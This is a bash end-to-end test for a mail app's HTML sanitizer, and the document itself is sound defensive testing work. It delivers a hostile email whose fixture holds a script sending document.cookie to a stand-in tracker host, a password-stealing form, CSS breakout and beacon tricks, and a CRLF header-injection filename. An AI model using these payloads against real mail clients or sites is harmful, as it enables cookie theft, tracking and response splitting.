#!/usr/bin/env bash
# SPDX-License-Identifier: AGPL-3.0-only
# Hostile content, proven end to end against the REAL image (Forgejo #39,
# spec §11). Companion to the in-process suites (internal/api, cmd/mailroom,
# internal/provider) and to docs/hostile-content.md.
#
# The unit tests prove the pieces. This proves the thing we SHIP: a hostile HTML
# email, delivered over IMAP into a real mailbox, synced by the real container,
# pulled back through the real JMAP API, comes out SANITIZED — and a real
# headless browser rendering exactly what the client renders makes ZERO requests
# to the sender's tracker and pops ZERO script dialogs.
#
# Five real things on one private docker network:
#   - postgres:18            the database
#   - dovecot                a real IMAP server (implicit TLS, self-signed) that
#                            we deliver the hostile message into
#   - mailroom:*             the real image, dev-auth, syncing the dovecot account
#   - a tracker              an HTTP listener that logs every hit. The whole test
#                            is: it must stay EMPTY.
#   - alpine-chrome          a real headless Chromium that renders the message
#                            document and proves nothing executes and nothing is
#                            fetched.
#
# Everything is container-to-container: no published ports, no host toolchain, no
# bind mounts of source. Same shape as scripts/gate-e2e.sh and mailsync-test.sh,
# so it runs identically on the Forgejo runner, on Linux, and in Git Bash.
#
# Usage:  scripts/hostile-content-e2e.sh
#         MAILROOM_IMAGE=mailroom:test scripts/hostile-content-e2e.sh
set -eu
MSYS_NO_PATHCONV=1; export MSYS_NO_PATHCONV

# ⚠ `$$` IS NOT UNIQUE ACROSS CONCURRENT RUNS, AND CLEANUP REMOVES BY NAME — so a
# fixed (or PID-only) name is one run reaping another's network/containers
# mid-test. MEASURED on 2026-10-15: a post-merge run on main and a PR run overlapped
# on one runner host; the PR's run hit `network with name ... already exists`, its
# cleanup trap then removed the network main's run was using, and main's jobs died
# mid-run. CI's concurrency group cancels only within a REF, so overlap is by
# design. Every Docker object name (and the built image tag) carries $UNIQ so
# cleanup can only ever touch this run's own objects (#502; same idiom as
# scripts/integration-test.sh).
UNIQ="$$-$(od -An -N4 -tu4 < /dev/urandom 2>/dev/null | tr -dc '0-9' || date +%s)"
[ -n "${UNIQ#*-}" ] || UNIQ="$$-$(date +%s)"

IMAGE="${MAILROOM_IMAGE:-mailroom:hostile-e2e-$UNIQ}"
PG_IMAGE="${PG_IMAGE:-postgres:18}"
DOVECOT_IMAGE="${DOVECOT_IMAGE:-dovecot/dovecot:2.3.21}"
CURL_IMAGE="${CURL_IMAGE:-curlimages/curl:8.10.1}"
# THE HEADLESS BROWSER IS PINNED BY DIGEST (#254) IN ONE SHARED FILE (#447).
# scripts/e2e-chrome-image.env holds the digest and the whole argument for it —
# read it there rather than here, because three suites now depend on the same
# pin and the reasoning must not exist in three drifting copies. `set -eu` above
# means a file that cannot be sourced stops this suite dead, and an unset
# CHROME_IMAGE afterwards is an immediate failure rather than a silent local
# default.
. "$(dirname "$0")/e2e-chrome-image.env"

NET="mailroom-hostile-e2e-$UNIQ"
VOL="mailroom-hostile-e2e-key-$UNIQ"
PG="mailroom-hostile-e2e-pg-$UNIQ"
DV="mailroom-hostile-e2e-dovecot-$UNIQ"
APP="mailroom-hostile-e2e-app-$UNIQ"
TRK="mailroom-hostile-e2e-tracker-$UNIQ"
CLIENTC="mailroom-hostile-e2e-client-$UNIQ"

TESTUSER="victim@example.com"
TESTPASS="victim-mailbox-password"

cd "$(dirname "$0")/.."
WORK="$(pwd)/.hostile-e2e-tmp.$UNIQ"
mkdir -p "$WORK"
WORK_HOST="$(cd "$WORK" && { pwd -W 2>/dev/null || pwd; })"

cleanup() {
  echo "--- cleaning up"
  docker rm -fv "$APP" "$DV" "$PG" "$TRK" "$CLIENTC" >/dev/null 2>&1 || true
  docker volume rm -f "$VOL" >/dev/null 2>&1 || true
  docker network rm "$NET" >/dev/null 2>&1 || true
  # Only an image THIS run built (uniquely tagged); a MAILROOM_IMAGE override is the caller's.
  if [ -z "${MAILROOM_IMAGE:-}" ]; then docker rmi "$IMAGE" >/dev/null 2>&1 || true; fi
  rm -rf "$WORK"
}
# ⚠ INT and TERM are NOT decoration: a CI cancellation sends SIGTERM, and a
# shell with only an EXIT trap dies WITHOUT running it. Measured in an alpine
# container — `trap cleanup EXIT` left the marker unwritten on SIGTERM, while
# `trap cleanup EXIT INT TERM` wrote it. That is how cancelled runs leaked
# long-lived side containers into the runners (mailroom#346); three were found
# aged 7h, 8h and 11h. cleanup is idempotent, so the EXIT trap firing again
# after the TERM trap is harmless.
trap cleanup EXIT INT TERM
cleanup >/dev/null 2>&1 || true
mkdir -p "$WORK"

# wait_for retries a readiness command until it succeeds. If it never does, it
# FAILS THE SCRIPT LOUDLY and dumps the container's log and final state.
#
# Without this the bare `for ... do <check> && break; done` loops just fell
# through on exhaustion and the script carried on against a service that was
# never up, so the failure surfaced later as something unrelated — a real CI run
# died with "container ... is not running" from the NEXT docker exec, which says
# nothing about postgres having failed to start. Diagnose at the point of
# failure, not three commands downstream.
#
#   $1 label, $2 attempts (~seconds), $3 container to dump on failure ("" none),
#   $4.. the command to run.
wait_for() {
  _label="$1"; _attempts="$2"; _dump="$3"; shift 3
  _i=0
  while [ "$_i" -lt "$_attempts" ]; do
    if "$@" >/dev/null 2>&1; then return 0; fi
    _i=$((_i + 1))
    sleep 1
  done
  echo "FATAL: $_label did not become ready after ${_attempts}s" >&2
  if [ -n "$_dump" ]; then
    echo "--- docker inspect $_dump ---" >&2
    docker inspect -f 'status={{.State.Status}} exit={{.State.ExitCode}} oomkilled={{.State.OOMKilled}} error={{.State.Error}}' \
      "$_dump" >&2 2>&1 || true
    echo "--- docker logs $_dump (last 50) ---" >&2
    docker logs --tail 50 "$_dump" >&2 2>&1 || true
  fi
  exit 1
}

if [ -z "${MAILROOM_IMAGE:-}" ]; then
  echo "--- building $IMAGE"
  docker build -t "$IMAGE" .
fi

echo "--- network + master key"
docker network create "$NET" >/dev/null
docker volume create "$VOL" >/dev/null
docker run --rm -v "$VOL:/k" "$PG_IMAGE" sh -c \
  'openssl rand -hex 32 | tr -d "\r\n" > /k/master && chmod 644 /k/master' >/dev/null

echo "--- tracker (the thing that must stay silent)"
# An HTTP listener that appends every request it receives to /tmp/hits. The whole
# test is that this file stays EMPTY: any hit means remote content was fetched.
# Built on the alpine-chrome image because it already has node — no package
# install, works offline.
docker run -d --name "$TRK" --network "$NET" --network-alias tracker.evil.example \
  --entrypoint node "$CHROME_IMAGE" -e '
    const fs = require("fs"); fs.writeFileSync("/tmp/hits","");
    require("http").createServer((req,res) => {
      fs.appendFileSync("/tmp/hits", req.method+" "+req.url+"\n");
      res.writeHead(200,{"Content-Type":"image/gif"}); res.end();
    }).listen(8099);
  ' >/dev/null
# ⚠ WAIT FOR IT, like every other container here. Nothing used to, and the cost
# was not a race — it was WHERE the failure surfaced. A tracker that never came
# up produced no complaint at startup and then, five minutes later, an assertion
# claiming the tracker HAD BEEN CONTACTED (§5), which is the opposite of what had
# happened and points at the code under test instead of at the harness.
# Failing here says what is actually wrong, at the moment it becomes true.
wait_for tracker 30 "$TRK" docker exec "$TRK" sh -c 'test -f /tmp/hits'

echo "--- postgres"
docker run -d --name "$PG" --network "$NET" --network-alias pg \
  -e POSTGRES_PASSWORD=postgres -e POSTGRES_DB=mailroom "$PG_IMAGE" >/dev/null
# -h 127.0.0.1 forces TCP: the postgres image's first-init temp server listens on
# the Unix socket ONLY, so a socket-based check reports "ready" before
# POSTGRES_DB=mailroom exists. TCP comes up only with the real post-init server.
wait_for postgres 60 "$PG" \
  docker exec "$PG" pg_isready -h 127.0.0.1 -U postgres -d mailroom -q

echo "--- roles + migrations"
docker exec "$PG" psql -U postgres -d mailroom -v ON_ERROR_STOP=1 \
  -c "CREATE ROLE mailroom_owner LOGIN PASSWORD 'owner' CREATEROLE;" \
  -c "GRANT ALL ON SCHEMA public TO mailroom_owner;" \
  -c "GRANT ALL ON DATABASE mailroom TO mailroom_owner;" >/dev/null
docker run --rm --network "$NET" --entrypoint /mailroom-migrate \
  -e MAILROOM_MIGRATE_DATABASE_URL="postgres://mailroom_owner:owner@pg:5432/mailroom?sslmode=disable" \
  "$IMAGE" up >/dev/null
docker exec "$PG" psql -U postgres -d mailroom -v ON_ERROR_STOP=1 \
  -c "ALTER ROLE mailroom_app LOGIN PASSWORD 'app';" >/dev/null

echo "--- dovecot (implicit TLS, self-signed) + a hostile message"
# A self-signed cert for the alias "dovecot". Implicit-TLS on 993 — the exact
# production TLS mode. (This is the server's cert; the app connects with
# InsecureSkipVerify=false, so a self-signed cert would normally be REJECTED —
# which is why we hand the app the CA below. That is the point: verification is on.)
# Generate the self-signed cert INSIDE a throwaway container and copy the files
# OUT with `docker cp` — a bind mount of a host path does not resolve when the CI
# job is itself a container with a socket-mounted Docker (the -v source is read by
# the host daemon, so $WORK — a path inside the job container — mounts an empty
# ghost dir and the certs never reach the job filesystem).
CERTGEN=$(docker create "$DOVECOT_IMAGE" sh -c '
  openssl req -x509 -newkey rsa:2048 -nodes -days 2 \
    -keyout /tmp/dovecot.key -out /tmp/dovecot.crt \
    -subj "/CN=dovecot" -addext "subjectAltName=DNS:dovecot" >/dev/null 2>&1')
docker start -a "$CERTGEN" >/dev/null 2>&1 || true
docker cp "$CERTGEN:/tmp/dovecot.crt" "$WORK_HOST/dovecot.crt"
docker cp "$CERTGEN:/tmp/dovecot.key" "$WORK_HOST/dovecot.key"
docker rm -fv "$CERTGEN" >/dev/null
# ⚠ `docker start -a … || true` above swallows a certgen failure, and an empty or
# truncated dovecot.crt would then be copied into BOTH dovecot and the app with
# nothing said. This is a cheap absent/empty guard, NOT the proof: what actually
# establishes the trust material is the handshake in the readiness check below,
# which compares the bytes dovecot serves against this exact file.
{ [ -s "$WORK/dovecot.crt" ] && [ -s "$WORK/dovecot.key" ] &&
  grep -q "BEGIN CERTIFICATE" "$WORK/dovecot.crt"; } || {
  echo "FATAL: certgen produced no usable certificate (crt $(wc -c < "$WORK/dovecot.crt" 2>/dev/null || echo 0) bytes)" >&2
  exit 1; }

cat > "$WORK/dovecot.conf" <<EOF
mail_home=/srv/mail/%Lu
mail_location=sdbox:~/Mail
mail_uid=1000
mail_gid=1000

protocols = imap

first_valid_uid = 1000
last_valid_uid = 1000

passdb {
  driver = static
  args = password=$TESTPASS
}

ssl = required
ssl_cert = </etc/dovecot/dovecot.crt
ssl_key = </etc/dovecot/dovecot.key
disable_plaintext_auth = yes

namespace inbox {
  inbox = yes
  separator = /
}

listen = *

log_path=/dev/stdout
info_log_path=/dev/stdout
debug_log_path=/dev/stdout
EOF

# The hostile message. Every technique from the corpus, delivered as real mail.
cat > "$WORK/hostile.eml" <<EOF
From: Attacker <attacker@evil.example>
To: $TESTUSER
Subject: Your invoice =?utf-8?B?PHNjcmlwdD4=?= is ready
Message-ID: <hostile-1@evil.example>
Date: Mon, 12 Jul 2026 10:00:00 +0000
MIME-Version: 1.0
Content-Type: text/html; charset=utf-8

<html><body>
<p>Your invoice is attached.</p>
<script>fetch("http://tracker.evil.example:8099/x?c="+document.cookie)</script>
<img src="http://tracker.evil.example:8099/pixel.gif?id=victim" width="1" height="1">
<img src="x" onerror="new Image().src='http://tracker.evil.example:8099/onerror'">
<style>@import url("http://tracker.evil.example:8099/import.css");body{background:url(http://tracker.evil.example:8099/bg.png)}</style>
<style>p{color:red}\3c /style\3e \3c img src="http://tracker.evil.example:8099/breakout.gif"\3e {color:blue}</style>
<style>a\3c b{color:red}x[y\3c z]{color:red}p{font-family:"\3c /style\3e "}</style>
<style>td > p{color:#123456}</style>
<svg><script>fetch("http://tracker.evil.example:8099/svg")</script></svg>
<form action="http://evil.example/steal"><input name="password" type="password"></form>
<meta http-equiv="refresh" content="0;url=http://tracker.evil.example:8099/refresh">
<link rel="dns-prefetch" href="//tracker.evil.example">
<link rel="preconnect" href="http://tracker.evil.example:8099">
<a href="https://real.example/ok">a legitimate link</a>
</body></html>
EOF

DVID=$(docker create --name "$DV" --network "$NET" --network-alias dovecot "$DOVECOT_IMAGE")
docker cp "$WORK_HOST/dovecot.conf" "$DVID:/etc/dovecot/dovecot.conf"
docker cp "$WORK_HOST/dovecot.crt" "$DVID:/etc/dovecot/dovecot.crt"
docker cp "$WORK_HOST/dovecot.key" "$DVID:/etc/dovecot/dovecot.key"
docker start "$DVID" >/dev/null
# doveadm is a precondition for the `doveadm save` two lines down and NOTHING
# MORE: it is a local binary that reads the config and the mail store directly,
# so it answers before the master process has finished starting and it never
# opens a socket. Measured: it returned on its FIRST attempt 655ms after
# `docker start`, while dovecot's own "starting up for imap" log line had not
# been written yet.
wait_for "dovecot (doveadm, local)" 60 "$DV" \
  docker exec "$DV" doveadm mailbox list -u "$TESTUSER"

# ⚠ THIS is the readiness that matters, and the old check did not imply it.
#
# The app's ONE job here is to dial 993, verify the certificate against the CA
# bundle we hand it, and sync. Three separate things have to hold for that, and
# `doveadm mailbox list` proved none of them: that the TLS listener on 993 is
# accepting, that it is reachable at the network alias the app dials, and that
# the certificate it serves is the one we are about to trust. So this is a real
# handshake from a SEPARATE container on this network — the app's exact path —
# and it compares the served certificate byte-for-byte against $WORK/dovecot.crt
# rather than merely observing that a handshake happened.
#
# Written this way because a port probe would go green against a server holding
# any certificate at all, and a mismatch there surfaces as an "unknown
# authority" failure ten steps later, in the app, dressed up as a rendering
# result (#432). The check needs no openssl on the host — it runs in the dovecot
# image, which has one — and it reads our cert from stdin.
dovecot_serves_our_cert() {
  docker run --rm -i --network "$NET" --entrypoint sh "$DOVECOT_IMAGE" -c '
    cat > /tmp/ours.crt
    ours=$(openssl x509 -noout -fingerprint -sha256 -in /tmp/ours.crt 2>/dev/null) || exit 1
    served=$(openssl s_client -connect dovecot:993 </dev/null 2>/dev/null |
             openssl x509 -noout -fingerprint -sha256 2>/dev/null) || exit 1
    [ -n "$ours" ] && [ "$ours" = "$served" ]
  ' < "$WORK/dovecot.crt"
}
wait_for "dovecot TLS on 993 serving OUR certificate" 60 "$DV" dovecot_serves_our_cert

docker cp "$WORK_HOST/hostile.eml" "$DV:/tmp/hostile.eml"
docker exec "$DV" sh -c "doveadm save -u '$TESTUSER' -m INBOX < /tmp/hostile.eml"
echo "delivered the hostile message into $TESTUSER INBOX"

echo "--- accounts file (the app connects to dovecot over implicit TLS, verifying the cert)"
# The app's CA bundle is the dovecot cert, so verification is ON and SUCCEEDS
# against a cert we control — rather than being switched off. SSL_CERT_FILE is
# read by Go's crypto/x509 on the alpine runtime.
cat > "$WORK/accounts.json" <<EOF
{"accounts":[{"name":"dovecot","imap_host":"dovecot","imap_port":993,
  "smtp_host":"dovecot","smtp_port":465,
  "username":"$TESTUSER","password":"$TESTPASS"}]}
EOF

echo "--- mailroom (dev-auth, syncing the dovecot account)"
# ⚠ CREATED, FED, THEN STARTED — the app process must never exist without its CA
# bundle. This used to boot the app, `docker cp` the two files in afterwards, and
# restart to pick them up; worse, it did that TWICE, booting a throwaway container
# without SSL_CERT_FILE first and then replacing it.
#
# The identical arrangement in scripts/inline-images-e2e.sh lost a required check
# on CI twice on byte-identical trees (#432), and the diagnosis applies here
# unchanged. The app reconciles the declared accounts file ~30ms into boot and
# dials IMAP to validate it. Reaching that point in the window BETWEEN the two
# docker cps means reading accounts.json while SSL_CERT_FILE names a file that
# does not exist yet, so the root pool has no CA and validation dies with
# "x509: certificate signed by unknown authority". The result LATCHES:
# reconcileAccounts leaves an account whose name already exists alone and does not
# touch sync_enabled, so no restart ever re-validates it — and because the row is
# in postgres, not in the container, even REPLACING the container does not clear
# it. The throwaway boot was therefore a second chance to poison the run, which is
# why it is gone rather than merely reordered.
APPID=$(docker create --name "$APP" --network "$NET" --network-alias mailroom \
  -v "$VOL:/k:ro" \
  -e MAILROOM_DATABASE_URL="postgres://mailroom_app:app@pg:5432/mailroom?sslmode=disable" \
  -e MAILROOM_MASTER_KEY_FILE=/k/master \
  -e MAILROOM_ALLOW_PRIVATE_ACCOUNT_HOSTS=1 \
  -e MAILROOM_DEV_AUTH_SUBJECT="operator" \
  -e MAILROOM_DEV_AUTH_I_UNDERSTAND="this-instance-has-no-authentication" \
  -e MAILROOM_DEV_AUTH_EMAIL="$TESTUSER" \
  -e MAILROOM_ACCOUNTS_FILE=/tmp/accounts.json \
  -e MAILROOM_SYNC_INTERVAL=2s \
  -e MAILROOM_SEARCH_DISABLED=1 \
  -e SSL_CERT_FILE=/tmp/dovecot.crt \
  -e MAILROOM_LOG_FORMAT=text \
  "$IMAGE")
docker cp "$WORK_HOST/accounts.json" "$APPID:/tmp/accounts.json"
docker cp "$WORK_HOST/dovecot.crt" "$APPID:/tmp/dovecot.crt"
docker start "$APPID" >/dev/null

wait_for "mailroom /readyz" 60 "$APP" \
  docker run --rm --network "$NET" "$CURL_IMAGE" -sf http://mailroom:8080/readyz

# ⚠ /readyz IS NOT EVIDENCE THAT THE ACCOUNT VALIDATED. The app serves every read
# path perfectly well with its one declared account stored sync-disabled, and this
# suite would then draw its remote-content conclusions from a message that never
# arrived. Boot onboarding logs one of two lines and never neither, so assert the
# positive one at the point the fault would occur.
#
# The loop waits for the LOG STREAM, not for validation to succeed — it ends on
# whichever of the two lines appears, so a genuine failure still falls straight
# through to the diagnosis below. `docker logs` reads a pipe the daemon drains
# asynchronously, and reconciliation running strictly before the listener starts
# is today's ordering, not a promise.
_boot_i=0
while [ "$_boot_i" -lt 10 ]; do
  if docker logs "$APP" 2>&1 | grep -qE 'msg="account added"|sync disabled'; then break; fi
  _boot_i=$((_boot_i + 1)); sleep 1
done
if ! docker logs "$APP" 2>&1 | grep -q 'msg="account added"'; then
  echo "FATAL: mailroom did not validate the declared dovecot account, so no mail can sync" >&2
  echo "       and every assertion below would be about a message that never arrived." >&2
  echo "--- mailroom onboarding lines ---" >&2
  docker logs "$APP" 2>&1 | grep -iE "account|sync disabled" | head -20 >&2 || true
  echo "--- the certificate the app was given as SSL_CERT_FILE ---" >&2
  docker exec "$APP" sh -c 'wc -c < /tmp/dovecot.crt' >&2 2>&1 || echo "  (absent)" >&2
  exit 1
fi
echo "the declared account validated against dovecot's TLS certificate"

echo
echo "=== driving the API from inside the network ================================"
set +e
# The client writes its scratch to its OWN /tmp and reports its failure count on
# stdout (INNER_FAILS=N) — no host bind mount, so it works in the CI runner. It is
# kept (not --rm) just long enough to copy the sanitized body OUT for the browser
# stage below, then removed.
CLIENT_OUT="$(docker run -i --name "$CLIENTC" --network "$NET" --entrypoint sh "$CURL_IMAGE" -s <<'CLIENT'
set -u
BASE=http://mailroom:8080
fails=0
ok()   { printf 'ok    %s\n' "$1"; }
bad()  { printf 'FAIL  %s\n' "$1"; fails=$((fails+1)); }

# --- headers on the app shell -----------------------------------------------
echo "--- 1. the app shell's security headers"
curl -sS -D /tmp/shell.h -o /dev/null "$BASE/"
for h in \
  "content-security-policy: default-src 'none'" \
  "content-security-policy:.*script-src 'self'" \
  "content-security-policy:.*frame-ancestors 'none'" \
  "x-content-type-options: nosniff" \
  "x-frame-options: DENY" \
  "referrer-policy: no-referrer"; do
  if grep -qiE "$h" /tmp/shell.h; then ok "shell has $h"; else bad "shell MISSING $h"; fi
done
grep -qiE "content-security-policy:.*'unsafe-inline'[^;]*script|script-src[^;]*'unsafe-inline'" /tmp/shell.h \
  && bad "shell CSP allows inline script" || ok "shell CSP has no inline script"

# --- the built index.html has no inline script ------------------------------
curl -sS -o /tmp/index.html "$BASE/index.html"
if grep -oiE '<script[^>]*>[^<]+</script>' /tmp/index.html | grep -q .; then
  bad "built index.html contains an INLINE script"
else
  ok "built index.html has no inline script (script-src 'self' is enforceable)"
fi

# --- wait for the hostile message to sync -----------------------------------
echo "--- 2. sync the hostile message"
EMAIL_ID=""
for _ in $(seq 1 40); do
  curl -sS -X POST "$BASE/jmap" -H 'content-type: application/json' -o /tmp/q.json \
    -d '{"using":["urn:ietf:params:jmap:core","urn:ietf:params:jmap:mail"],
         "methodCalls":[["Email/query",{"accountId":"","filter":{"text":""}},"0"]]}' 2>/dev/null
  # Fall back to listing all: query without a text filter.
  curl -sS -X POST "$BASE/jmap" -H 'content-type: application/json' -o /tmp/q.json \
    -d '{"using":["urn:ietf:params:jmap:core","urn:ietf:params:jmap:mail"],
         "methodCalls":[["Email/query",{"accountId":""},"0"]]}' 2>/dev/null
  EMAIL_ID=$(grep -oE '"ids":\["[^"]+"' /tmp/q.json | head -1 | sed -E 's/.*\["([^"]+)"/\1/')
  [ -n "$EMAIL_ID" ] && break
  sleep 2
done
if [ -z "$EMAIL_ID" ]; then bad "the message never synced"; echo "INNER_FAILS=$fails"; cat /tmp/q.json; exit; fi
ok "message synced: $EMAIL_ID"

# --- fetch the body the way the reading pane does ---------------------------
echo "--- 3. fetch the body through Email/get and inspect what a client receives"
curl -sS -X POST "$BASE/jmap" -H 'content-type: application/json' -o /tmp/body.json \
  -d "{\"using\":[\"urn:ietf:params:jmap:core\",\"urn:ietf:params:jmap:mail\"],
       \"methodCalls\":[[\"Email/get\",{\"accountId\":\"\",\"ids\":[\"$EMAIL_ID\"],
         \"properties\":[\"htmlBody\",\"bodyValues\"],\"fetchHTMLBodyValues\":true},\"0\"]]}"

# The bodyValue is JSON-encoded; that is what a client parses. Assert on it.
for needle in '<script' '<svg' '<form' '<input' '<meta' '<link' 'onerror' \
              'document.cookie' '@import' 'javascript:' 'evil.example/steal' \
              'http-equiv'; do
  if grep -qi -- "$needle" /tmp/body.json; then
    bad "Email/get served the dangerous construct: $needle"
  else
    ok "sanitized away: $needle"
  fi
done
# The tracker URL may survive ONLY parked in a data- attribute. What must never
# survive is a LIVE src to it (in JSON, the quote is escaped as \"). This — not
# "the URL is absent" — is the block: the URL is deliberately preserved so the
# client can offer to load it, and the tracker's zero hits (§5) + the browser's
# zero remote requests (§6) prove it is not live.
# The space before `src` is what distinguishes a live `<img src=\"` from a parked
# `data-mailroom-remote-src=\"` (which ends in the same four bytes).
if grep -qiE ' src=\\"https?://tracker| src=\\"//tracker' /tmp/body.json; then
  bad "a LIVE remote src to the tracker survived"
else
  ok "no live remote src (the tracker URL survives only parked in a data- attribute)"
fi
# ── <style> BREAKOUT ATTEMPT (#324) ─────────────────────────────────────────
#
# #324 narrowed writeStyleElement's guard from "no '<' or '>'" to "no '<'", which
# is what let the child combinator through. '</style' is the only thing that ends
# a raw-text element, so refusing '<' is necessary and sufficient.
#
# ⚠ WHAT THIS ASSERTION IS, AND WHAT IT IS NOT — because the honest answer was
# established by probing rather than assumed.
#
# It is REGRESSION COVERAGE for a combination, not a falsifiable proof. Breaking
# the delim allowlist alone (putting '<' back into cssPreludeDelims) leaves this
# check GREEN, and that was measured, not guessed. Four independent mechanisms
# have to fail together before a '</style' can be produced:
#
#   1. an ESCAPED '<' always starts an ident sequence per CSS Syntax §4.3.9, so
#      it becomes an identifier and cssNoMarkupChars refuses it — it can never
#      be a delimiter, however it is spelled;
#   2. a LITERAL '</style' never reaches the CSS filter, because the HTML parser
#      terminates the raw-text element on it first;
#   3. tokens cannot be fused into one: an elided comment serializes as
#      whitespace, so '<' '/' 'style' comes back as "< /style", never "</style";
#   4. and writeStyleElement drops any element whose CSS contains a '<' at all.
#
# The FALSIFIABLE checks for this change are the unit tests, which were probed
# red at both the constant level (cssPreludeDelims gaining '<') and the
# behavioural level (a '</style>' prelude surviving into output). This is the
# cheap end-to-end backstop for all four failing at once, and it is worth having
# on exactly those terms — not on stronger ones.
if grep -qi 'breakout.gif' /tmp/body.json; then
  bad "a <style> breakout succeeded: the escaped </style> reached the client as markup"
else
  ok "the escaped </style> breakout attempts did not escape their element"
fi
# ⚠ POSITIVE CONTROL for the line above. "breakout.gif is absent" is also what a
# sanitizer that dropped the entire message would produce, and this suite has
# shipped that mistake before (#131, #284). The child-combinator rule proves the
# <style> path is alive and that #324's widening actually took effect — if this
# is missing, the assertion above is worthless.
if grep -qi '#123456' /tmp/body.json; then
  ok "the child combinator survived (#324) — so the breakout check above ran against a live <style> path"
else
  bad "the child-combinator rule did not survive: either #324 regressed, or the <style> path is dead and the breakout assertion above proves nothing"
fi

# The legitimate content survives.
grep -qi 'Your invoice is attached' /tmp/body.json \
  && ok "legitimate message text survived" || bad "the sanitizer destroyed the message"
grep -qi 'real.example/ok' /tmp/body.json \
  && ok "the legitimate link survived" || bad "a legitimate link was dropped"
# The tracking pixel is BLOCKED (parked), not silently gone.
grep -qi 'data-mailroom-blocked' /tmp/body.json \
  && ok "the tracking pixel is marked blocked for the client" \
  || bad "the blocked pixel is not marked (no Show-remote-content affordance)"

# ⚠ AND IT IS PARKED WHERE THE CLIENT CANNOT RESTORE IT (#55 increment 2). The
# fixture's pixel is 1x1, so it is a beacon rather than a picture: its URL goes
# under `data-mailroom-pixel-src`, a name the client's restore does not mention,
# which is what makes the suppression structural instead of a decision.
#
# Asserted over a REAL HTTP Email/get response rather than in a unit test,
# because the two are different claims — the property has to survive JSON
# encoding and the whole dispatcher to reach a client at all.
grep -qi 'data-mailroom-pixel-src' /tmp/body.json \
  && ok "the 1x1 is parked under the pixel name, which the client never restores" \
  || bad "the 1x1 was parked under a RESTORABLE name — allowing this sender would load it"
# The other half: it must NOT also carry the restorable name.
if grep -qi 'data-mailroom-remote-src' /tmp/body.json; then
  bad "the body carries a restorable remote-src — for this fixture the only remote image is the beacon, so it must not be restorable"
else
  ok "no restorable remote-src survives for a body whose only remote image is a beacon"
fi

# --- header injection via a download filename -------------------------------
echo "--- 4. header injection via an attachment filename"
BLOB="$(printf '0%.0s' $(seq 1 64))"
curl -sS -D /tmp/dl.h -o /dev/null \
  "$BASE/jmap/download/00000000000000000000000000/$BLOB/inv.pdf%0d%0aSet-Cookie:%20x=1%0d%0a"
if grep -qi '^set-cookie:' /tmp/dl.h; then
  bad "a filename injected a Set-Cookie header"
else
  ok "a CRLF filename did not split the response"
fi
grep -qi 'x-content-type-options: nosniff' /tmp/dl.h \
  && ok "the download response is nosniff (even on 401/404)" \
  || bad "the download response is not nosniff"

# --- JMAP responses are nosniff too -----------------------------------------
curl -sS -D /tmp/j.h -o /dev/null "$BASE/jmap/session"
grep -qi 'x-content-type-options: nosniff' /tmp/j.h \
  && ok "JMAP responses are nosniff" || bad "JMAP responses are not nosniff"

echo "INNER_FAILS=$fails"
CLIENT
)"
set -e
printf '%s\n' "$CLIENT_OUT"
# The browser stage renders the sanitized body the client fetched; copy it out
# before dropping the client container.
docker cp "$CLIENTC:/tmp/body.json" "$WORK_HOST/body.json" 2>/dev/null || true
docker rm -fv "$CLIENTC" >/dev/null 2>&1 || true

# Failures accumulate as lines in this file: the inner client reported its count
# on stdout (INNER_FAILS=N); each stage below appends one "1" per failure.
FAILFILE="$WORK/fails"
inner=$(printf '%s\n' "$CLIENT_OUT" | sed -n 's/.*INNER_FAILS=\([0-9][0-9]*\).*/\1/p' | tail -1)
: > "$FAILFILE"
[ "${inner:-0}" != "0" ] && [ -n "${inner:-}" ] && printf '1\n%.0s' $(seq 1 "$inner") >> "$FAILFILE"

echo
echo "--- 5. THE TRACKER: it must never have been contacted (server side)"
# ⚠ THREE OUTCOMES, NOT TWO, AND CONFLATING THEM MADE THIS CHECK LIE.
#
# It used to read `wc -c < /tmp/hits` and treat anything that was not "0" as a
# hit. When the tracker container is not answering — it died, or never got as far
# as creating the file — `docker exec` produces NOTHING, so HITS became the empty
# string, which is not "0", and the run failed with:
#
#     FAIL  the tracker was contacted ( bytes):
#     cat: can't open '/tmp/hits': No such file or directory
#
# An empty byte count and a missing file, reported as evidence of contact. That is
# the worst kind of failure message: it accuses the code under test of exactly the
# thing this suite exists to detect, on the strength of no evidence at all, and it
# sent the reader looking for a remote fetch that had not happened (the browser
# check in §6 said so at the time).
#
# The states are: the tracker was silent, the tracker was contacted, and THE CHECK
# COULD NOT RUN. The third is still a failure — a security assertion that did not
# execute must never read as a pass (#131) — but it has to say what it is.
if ! docker exec "$TRK" sh -c 'test -f /tmp/hits' >/dev/null 2>&1; then
  echo "FAIL  ⚠ THIS CHECK DID NOT RUN. The tracker's hit log is unreadable, which"
  echo "      means the tracker container is not answering — not that anything was"
  echo "      fetched. Nothing here says whether remote content was requested."
  echo "      Tracker container state:"
  docker inspect -f '        status={{.State.Status}} exit={{.State.ExitCode}} oom={{.State.OOMKilled}} err={{.State.Error}}' "$TRK" 2>&1 | head -2
  echo "      Last output from it:"
  docker logs --tail 10 "$TRK" 2>&1 | sed 's/^/        /' | head -12
  echo "1" >> "$FAILFILE"
else
  HITS=$(docker exec "$TRK" sh -c 'wc -c < /tmp/hits' 2>/dev/null | tr -d ' \r\n')
  if [ "$HITS" = "0" ]; then
    echo "ok    the tracker received ZERO bytes — the server fetched nothing remote"
  else
    echo "FAIL  the tracker was contacted ($HITS bytes):"
    docker exec "$TRK" sh -c 'cat /tmp/hits' | head -20
    echo "1" >> "$FAILFILE"
  fi
fi

echo
echo "--- 6. A REAL BROWSER renders the sanitized body; nothing runs, nothing"
echo "       fetched — AND the content-fit auto-height works (Forgejo #100)."

# ⚠ THE POLICY UNDER TEST IS READ OUT OF THE REPO, NOT TYPED IN HERE (#308).
#
# This stage used to carry hand-written copies of four artifacts — the height
# reporter and its sha256, the app-shell CSP, the message CSP + sandbox tokens,
# and the preview response headers — and nothing compared a copy to its source.
# They had drifted: the copied appCSP said `frame-src 'self' blob:` and omitted
# `worker-src 'self'` entirely, so the browser stage was proving things about a
# policy this server does not serve.
#
# scripts/e2e-policy.cjs parses the three authoritative files instead. They are
# staged here rather than bind-mounted because the browser container has no
# checkout (same reason as the certs above), and `set -e` means a MOVED source
# stops the suite here — which is the point: with the policy unreadable there is
# nothing to test, and a skip would read exactly like a pass.
mkdir -p "$WORK/policy-src"
cp scripts/e2e-policy.cjs "$WORK/policy-src/e2e-policy.cjs"
cp web/src/app/ui/messageDocument.ts "$WORK/policy-src/messageDocument.ts"
cp cmd/mailroom/main.go "$WORK/policy-src/main.go"
cp internal/api/blob.go "$WORK/policy-src/blob.go"
